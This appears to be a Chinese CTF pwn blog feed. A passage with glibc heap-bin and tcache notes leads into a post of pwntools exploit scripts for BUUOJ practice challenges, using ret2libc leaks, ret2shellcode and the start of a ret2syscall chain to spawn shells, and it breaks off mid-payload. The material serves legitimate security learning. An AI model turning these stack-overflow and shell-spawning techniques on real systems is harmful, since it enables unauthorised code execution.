页\&quot;&gt;7ZlNc5swEIZ/jY/JgASCHOPEaQ7pNDNups0poxoF6GCJCvmrv74rIwyCEieeSUybnMyupEV6tK9YwwhfzNefJM2TzyJi2Qg50XqEL0cIuTg8gx/t2RiPEzilJ5ZpVPoajmn6m1UdjXeRRqwwvtKlhMhUmtvOmeCczZTlo1KKld3tUWSR5chpzKxpaMd0RjPW6fYtjVRSekMU1P5rlsZJdWeXmBXPadXZBC4SGolVw4UnI3whhVDl1Xx9wTJNz+Zy1dO6m5hkXD1nwPVEnE/c5bn/8JD9ouvwhn+5OzFRljRbmAV/FYrqYeOUFyNEMog9/iHhKtZXLiZmNWpTIZJiwSOm7+JAj1WSKjbN6Uy3riArwJeoeQaWC5ePgiuzyy4B29yfScXWvQtzd7gg0ZiYMyU30MUMQBVyk2MnQVjaq3rDXGJ2IWlsVmh81ORIvAtdY4QLQ/IFVHGH6hUtVD9UZ3BMXddCivzgyEi9DtI7XghYYdSPdXBUEQkGhtXvYL2hEk7EPqYEDw6qj52BQSUdqNM5zfoPVYIGBzVonanHhxp0oPaoHg3vCdVO0QAdGeZZB2aHGYugDjImFxx+xnDcJiIWnGY3QuQG10+m1MbwogslbJg2+SZawDVmPDrXNRrYImccPIWictfFK7s0zUIs5IzdMpkCCCb1LqY8htYQGpU+ulRP42whl9uJ6Gmxdaq+60mdIt+Y942my7WZ8NbYVAYH9OUovzLvm231sK1VjSvRap5Ppw/g365uf7lWLnRfAdJNx2a+eSa3JMuoSpf23P6WcCbcrUi5qlMbO61KISR2CLNj5ahmedoK5Hl7ApndbQeCBKKbRrdcdyg6CtlROFw0VZn2flVzoAAqtbkNqUGIwH9abmDsZnU8KQUfUnoFKXX/d74zKf2jD6Dgmarx3kw17drKdfCBqsF2yYvdVqDjqwZ9qEY18v9/E43/ZqJBDrJyvXov8VLNuO33REEr0PE1030X9141ExwkGo80VXPinML5uqfc09YrVm7PlRN5MzkR1HoGVW90Xqongj1bT21hvqKewKw/RpTd6286ePIH&lt;/diagram&gt;&lt;/mxfile&gt;&quot;}"></div><script type="text/javascript" src="https://viewer.diagrams.net/js/viewer-static.min.js"></script>#### fast bin<p>在free一个chunk到fast bin时，它下一个chunk的P位（PREV_INUSE)是不会变的，还是为1，为了加快free的效率。<strong>因此地址连续的两个chunk 被free到fast bin，他们不会被合并</strong>。</p><p><strong>content的大小范围：32位：8~80，64位：16~160</strong>，都是10个bin，但是实际上fastbin的大小范围并不包含最大的两个bin (64bit 0x80就已经不进fastbin了)</p><p>新的chunk加入bin时，<strong>fd</strong>指向原来的栈顶，先进后出（LIFO）</p><h4 id="small-bin"><a href="#small-bin" class="headerlink" title="small bin"></a>small bin</h4><p>大小范围</p><p>32位，最小为16字节，公差为8，最大为504字节，所以是62个small bin</p><p>64为，最小为32字节，公差为16，最大为1008字节</p><h4 id="large-bin"><a href="#large-bin" class="headerlink" title="large bin"></a>large bin</h4><p>大小范围</p><p>32位（大于等于512字节）64位（大于等于1024字节），每个链表里的chunk不一定一样大，只要是属于某个特定区间就行</p><p>63个bin被分为6组</p><table><thead><tr><th align="center"></th><th align="center">数量</th><th align="center">公差</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">32</td><td align="center">64字节</td></tr><tr><td align="center">2</td><td align="center">16</td><td align="center">512</td></tr><tr><td align="center">3</td><td align="center">8</td><td align="center">4096</td></tr><tr><td align="center">4</td><td align="center">4</td><td align="center">32768</td></tr><tr><td align="center">5</td><td align="center">2</td><td align="center">262144</td></tr><tr><td align="center">6</td><td align="center">1</td><td align="center">不限制</td></tr></tbody></table><p>第一组起始大小是512，也就是第一组的第一个bin的范围为[512,512+64) ， 最后一个为[512 + 64*31, 512 + 64*32)</p><p>第二组接着第一组的末尾，第一个bin也就是[2560, 2560+ 512)，以此类推</p><p>每个的具体大小可在第四个参考文献里看</p><h4 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h4><p>释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中</p><p>分配时，如果在unsorted bin里没找到合适的chunk，则把unsorted bin里的chunk分配到small 和 large里，，然后再在 bin 中分配合适的 chunk</p><h3 id="内存分配流程"><a href="#内存分配流程" class="headerlink" title="内存分配流程"></a>内存分配流程</h3><p> <img src="/img/heapexploitation/1.jpg"></p><h3 id="内存释放流程"><a href="#内存释放流程" class="headerlink" title="内存释放流程"></a>内存释放流程</h3><p> <img src="/img/heapexploitation/2.jpg"></p><h3 id="tcache相关知识"><a href="#tcache相关知识" class="headerlink" title="tcache相关知识"></a>tcache相关知识</h3><p>以下全是64位机器来说</p><p>tcache从2.26开始才有，tcache同fastbin，先进后出，不动inuse</p><p>tcache出现后，每次产生堆都会先产生一个0x250大小的堆块，位于堆的开头。这0x250中（header占16字节），前0x40字节，对应64条tcache的链表，描述每个链表中的个数（每个链表最多7个chunk），然后0x200字节对应每个链表的开头地址。</p><p>tcache的64个链表从0x20开始，到0x410结束，公差16字节</p><p>tcache的链表指针指向的是chunk的content，而不是开头</p><blockquote><p>在老的2.27中没有doublefree检查</p></blockquote><h3 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h3><p><a href="https://heap-exploitation.dhavalkapil.com/">Heap Exploitation</a></p><p><a href="https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/">Understanding glibc malloc</a></p><p><a href="https://sploitfun.wordpress.com/2015/02/11/syscalls-used-by-malloc/">Syscalls used by malloc</a></p><p><a href="https://paper.seebug.org/papers/Archive/refs/heap/glibc%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86ptmalloc%E6%BA%90%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90.pdf">glibc 内存管理 ptmalloc 源代码分析</a></p><p><a href="https://sensepost.com/blog/2017/painless-intro-to-the-linux-userland-heap/">Painless intro to the Linux userland heap</a></p>]]></content>
    
    
    <categories>
      
      <category>ctf-pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-pwn</tag>
      
      <tag>heap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ROP</title>
    <link href="/2022/11/16/ctf-pwn/ROP/"/>
    <url>/2022/11/16/ctf-pwn/ROP/</url>
    
    <content type="html"><![CDATA[<h3 id="题目1"><a href="#题目1" class="headerlink" title="题目1"></a>题目1</h3><p><a href="https://buuoj.cn/challenges#ciscn_2019_c_1">https://buuoj.cn/challenges#ciscn_2019_c_1</a></p><p><strong>Exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p = process(<span class="hljs-string">&#x27;./ciscn_2019_c_1&#x27;</span>)<br><span class="hljs-comment"># p = remote(&#x27;node4.buuoj.cn&#x27;,29563) </span><br>elf = ELF(<span class="hljs-string">&#x27;./ciscn_2019_c_1&#x27;</span>)<br><br>ret=<span class="hljs-number">0x4006b9</span><br>rdi=<span class="hljs-number">0x400c83</span><br>main=elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br>puts_plt=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br><span class="hljs-comment">#第一次攻击绕过函数</span><br>p.sendlineafter(<span class="hljs-string">b&#x27;Input your choice!\n&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>payload=<span class="hljs-string">b&#x27;\0&#x27;</span>+<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x50</span>-<span class="hljs-number">1</span>+<span class="hljs-number">8</span>)+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(main)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Input your Plaintext to be encrypted\n&#x27;</span>,payload)<br> <br> <br> <br>p.recvline()<span class="hljs-comment">#接收字符串Ciphertext</span><br>p.recvline()    <span class="hljs-comment">#加密后的密文</span><br><span class="hljs-comment">#这里注意需要接收2次</span><br> <br>puts_addr=u64(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\0&#x27;</span>))  <span class="hljs-comment">#得到 puts 函数 的地址</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(puts_addr))<br><br>libc=LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span>,puts_addr) <span class="hljs-comment">#获取libc的版本</span><br>offset=puts_addr-libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>) <span class="hljs-comment">#计算偏移量</span><br>binsh=offset+libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>) <span class="hljs-comment">#计算字符串&quot;/bin/sh&quot;的地址</span><br>system=offset+libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>) <span class="hljs-comment">#计算函数system的地址</span><br> <br><span class="hljs-comment">#第二次攻击getshell</span><br> <br>p.sendlineafter(<span class="hljs-string">b&#x27;Input your choice!\n&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)     <span class="hljs-comment">#   再一次执行 一遍流程</span><br>payload=<span class="hljs-string">b&#x27;\0&#x27;</span>+<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x50</span>-<span class="hljs-number">1</span>+<span class="hljs-number">8</span>)+p64(ret)+p64(rdi)+p64(binsh)+p64(system)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Input your Plaintext to be encrypted\n&#x27;</span>,payload)<br>p.interactive()<br><br><br><br><span class="hljs-comment"># ubuntu18版本以上调用64位程序中的system函数的栈对齐问题</span><br><span class="hljs-comment"># https://www.cnblogs.com/ZIKH26/articles/15996874.html</span><br></code></pre></td></tr></table></figure><h3 id="题目2"><a href="#题目2" class="headerlink" title="题目2"></a>题目2</h3><p><a href="https://buuoj.cn/challenges#bjdctf_2020_babyrop">https://buuoj.cn/challenges#bjdctf_2020_babyrop</a></p><p>非常基本的一道利用puts函数构造rop链泄露libc基址的题目</p><p><strong>Exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">25323</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./bjdctf_2020_babyrop&#x27;</span>)<br><br>main = elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br>poprdi_ret = <span class="hljs-number">0x400733</span><br><br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br>s = p.recv()<br><span class="hljs-built_in">print</span>(s)<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">40</span> + p64(poprdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main)<br><br>p.sendline(payload)<br><br>s = p.recv()<br><br>puts_addr = u64(s[:<span class="hljs-number">6</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(puts_addr))<br><br>libc =LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span>,puts_addr)<br>offset = puts_addr - libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br>binsh = offset + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br>system = offset + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">40</span> + p64(poprdi_ret) + p64(binsh) + p64(system)<br><br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="题目3"><a href="#题目3" class="headerlink" title="题目3"></a>题目3</h3><p><a href="https://buuoj.cn/challenges#get_started_3dsctf_2016">https://buuoj.cn/challenges#get_started_3dsctf_2016</a></p><p>一道十分简单的栈溢出，将main的返回地址移交给自带的get_flag函数</p><p>把这道题列出来的原因在于，程序没有开启标准输入输出，</p><p>如果单纯执行完get_flag不设置一个正确的返回地址，这个函数里的输出显示不出来</p><p>（详细原因目前也不是很清楚）</p><p><strong>Exp</strong></p><p>针对上述问题，选择exit函数作为get_flag的返回地址（不能放一个空着的p32(0)进去）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#p = remote(&quot;node4.buuoj.cn&quot;,27230)</span><br>p = process(<span class="hljs-string">&#x27;./get_started_3dsctf_2016&#x27;</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./get_started_3dsctf_2016&#x27;</span>)<br><br>get_flag = <span class="hljs-number">0x80489A0</span><br>param1 = <span class="hljs-number">0x308CD64F</span><br>param2 = <span class="hljs-number">0x195719D1</span><br><br>sleep(<span class="hljs-number">0.1</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">56</span> + p32(get_flag) +p32(<span class="hljs-number">0x0804E6A0</span>) + p32(param1) + p32(param2)<br><br>p.sendline(payload)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><h3 id="题目4"><a href="#题目4" class="headerlink" title="题目4"></a>题目4</h3><p><a href="https://buuoj.cn/challenges#[HarekazeCTF2019]baby_rop">https://buuoj.cn/challenges#[HarekazeCTF2019]baby_rop</a></p><p>从给定libc获取获取基址</p><p>由于给了libc版本，此exp展示使用指定的libc文件获取偏移的方法</p><p>不用给的libc文件的见下一道题，harekaze2019的babyrop2</p><p><strong>Exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># p = process(&#x27;./pwn&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">28818</span>)<br>e = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><br><span class="hljs-comment">#payload 1</span><br>payload1 = <span class="hljs-string">&#x27;\x00&#x27;</span> + <span class="hljs-string">&#x27;\xff&#x27;</span> * <span class="hljs-number">7</span><br>p.sendline(payload1)<br>p.recvuntil(<span class="hljs-string">&quot;Correct\n&quot;</span>)<br><br><span class="hljs-comment">#payload 2</span><br>payload2 = (<span class="hljs-number">231</span> + <span class="hljs-number">4</span>) * <span class="hljs-string">b&#x27;a&#x27;</span> + p32(e.plt[<span class="hljs-string">&#x27;write&#x27;</span>]) + p32(<span class="hljs-number">0x08048825</span>) +p32(<span class="hljs-number">1</span>) + p32(e.got[<span class="hljs-string">&#x27;write&#x27;</span>]) + p32(<span class="hljs-number">4</span>)<br><br>p.sendline(payload2)<br><br><span class="hljs-comment"># leak addr</span><br>write_got = u32(p.recv(<span class="hljs-number">4</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(write_got))<br><br><span class="hljs-comment">#payload 3</span><br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>libc.address =  write_got - libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>system = libc.sym[<span class="hljs-string">&quot;system&quot;</span>]<br>binsh = <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>))<br>p.sendline(payload1)<br>payload3 =  (<span class="hljs-number">231</span> + <span class="hljs-number">4</span>) * <span class="hljs-string">b&#x27;a&#x27;</span> + p32(system) + p32(<span class="hljs-number">0xdeadbeef</span>) + p32(binsh)<br>p.sendline(payload3)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="题目5"><a href="#题目5" class="headerlink" title="题目5"></a>题目5</h3><p><strong>题目</strong></p><p><a href="https://buuoj.cn/challenges#[HarekazeCTF2019]baby_rop2">https://buuoj.cn/challenges#[HarekazeCTF2019]baby_rop2</a></p><p>和前面一个题目同样，是一个构造rop链的栈溢出，虽然题目也给了libc文件，但是不是必要的</p><p><strong>方法</strong></p><p>这道题目的差别或值得注意的地方在于</p><ol><li><p>不再是用puts函数（只需要一个参数），这道题目中可以用printf构造rop链</p><p>printf有两个参数，除了rdi寄存器之外，还需要rsi寄存器来传递参数，但是这个程序里没有直接的<code>pop rsi, ret</code>的代码，只有一个<code>pop rsi, pop r15, ret</code>，因此需要再额外给r15在栈上留出一个空间。详见exp代码。</p></li><li><p>用read函数进行libc基地址泄露，虽然理论上用printf也可以，但是我不知道为什么没有成功，我在网上查的时候别人也有这个问题</p></li></ol><p><strong>Exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#p = process(&#x27;./babyrop2&#x27;)</span><br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">29507</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./babyrop2&#x27;</span>)<br><br>poprdi_ret = <span class="hljs-number">0x400733</span><br>poprsi_popr15_ret = <span class="hljs-number">0x400731</span><br>main = elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br>printf_plt = elf.plt[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>printf_got = elf.got[<span class="hljs-string">&#x27;printf&#x27;</span>]<br><br>read_plt = elf.plt[<span class="hljs-string">&#x27;read&#x27;</span>]<br>read_got = elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br><br>format_str = <span class="hljs-number">0x400790</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">40</span> + p64(poprdi_ret) + p64(format_str) + \<br>          p64(poprsi_popr15_ret) + p64(read_got) + p64(<span class="hljs-number">0</span>) + p64(printf_plt) + p64(main)<br><br>p.sendlineafter(<span class="hljs-string">&quot;What&#x27;s your name? &quot;</span>,payload)<br><br>read_addr = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;read_addr:&#x27;</span> + <span class="hljs-built_in">hex</span>(read_addr))<br><br>libc = LibcSearcher(<span class="hljs-string">&#x27;read&#x27;</span>, read_addr)<br>offset = read_addr - libc.dump(<span class="hljs-string">&#x27;read&#x27;</span>)<br>binsh = offset + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br>system = offset + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">40</span> + p64(poprdi_ret) + p64(binsh) + p64(system)<br><br>p.sendlineafter(<span class="hljs-string">&quot;What&#x27;s your name? &quot;</span>, payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="题目6"><a href="#题目6" class="headerlink" title="题目6"></a>题目6</h3><p><a href="https://buuoj.cn/challenges#ciscn_2019_n_5">https://buuoj.cn/challenges#ciscn_2019_n_5</a></p><p><img src="/img/ciscn_2019_n_5/1.jpg"></p><p>依旧是栈溢出，可以构造rop，也可以直接ret2shellcode（没开NX）</p><p>由于rop写习惯了，先列出rop的做法</p><p><img src="/img/ciscn_2019_n_5/2.jpg"></p><p>第一个输入随便写，第二个输入开始溢出</p><p><img src="/img/ciscn_2019_n_5/3.jpg"></p><p>溢出30+2+8 = 40个字节，用puts的got表来泄露libc基址</p><p>值得注意的是返回main后第二遍溢出时需要栈对齐</p><p><strong>Exp1</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#p = process(&quot;./ciscn_2019_n_5&quot;)</span><br>p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">27829</span>)<br><br>e = ELF(<span class="hljs-string">&quot;./ciscn_2019_n_5&quot;</span>)<br><br>main = e.symbols[<span class="hljs-string">&quot;main&quot;</span>]<br>puts_got = e.got[<span class="hljs-string">&quot;puts&quot;</span>]<br>puts_plt = e.plt[<span class="hljs-string">&quot;puts&quot;</span>]<br><br>pop_rdi = <span class="hljs-number">0x400713</span><br>ret = <span class="hljs-number">0x4004c9</span><br><br>p.recvline()<br>p.sendline(<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>p.recvline()<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">40</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)<br><br>p.sendlineafter(<span class="hljs-string">b&quot;What do you want to say to me?\n&quot;</span>, payload)<br><br>puts_addr =  u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(puts_addr))<br><br>libc = LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span>, puts_addr)<br>offset = puts_addr - libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br>system = offset + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>binsh = offset + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><br>p.recvline()<br>p.sendline(<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>p.recvline()<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">40</span> + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)<br>p.sendlineafter(<span class="hljs-string">b&quot;What do you want to say to me?\n&quot;</span>, payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><p><strong>ret2shellcode</strong></p><p><img src="/img/ciscn_2019_n_5/4.jpg"></p><p>由于题目给了bss段上100个字节的空间，可以用来写shellcode</p><p>需要在注意的包括context.arch设置平台环境</p><p>而且特意看了一下 <code>len(shellcode) </code>是 48 &lt; 100字节</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#p = process(&quot;./ciscn_2019_n_5&quot;)</span><br>p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">27829</span>)<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>shellcode = asm(shellcraft.sh())<br>name_addr = <span class="hljs-number">0x0601080</span><br>p.sendlineafter(<span class="hljs-string">&quot;tell me your name\n&quot;</span>,shellcode)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">0x20</span> + <span class="hljs-number">0x8</span>) + p64(name_addr)<br>p.sendlineafter(<span class="hljs-string">b&quot;What do you want to say to me?\n&quot;</span>,payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="题目7"><a href="#题目7" class="headerlink" title="题目7"></a>题目7</h3><p>发现没有写过ret2syscall的题目，记录一下方便忘了再看</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = <span class="hljs-string">b&#x27;/flag\x00&#x27;</span>+<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x48</span>-<span class="hljs-number">6</span>) + p64(pop_rdi)+p64(buf)+p64(pop_rsi)+p64(<span class="hljs-number">0</span>)\<br>    + p64(pop_rdx) + p64(<span class="hljs-number">0</span>) \<br>    + p64(pop_rax)+p64(<span class="hljs-number">2</span>)+p64(syscall) + p64(pop_rdi) + p64(<span class="hljs-number">3</span>) +p64(pop_rsi) + p64(buf+<span class="hljs-number">0x10</span>) \<br>    +p64(pop_rdx)+p64(<span class="hljs-number">0x32</span>) +p64(pop_rax)+p64(<span 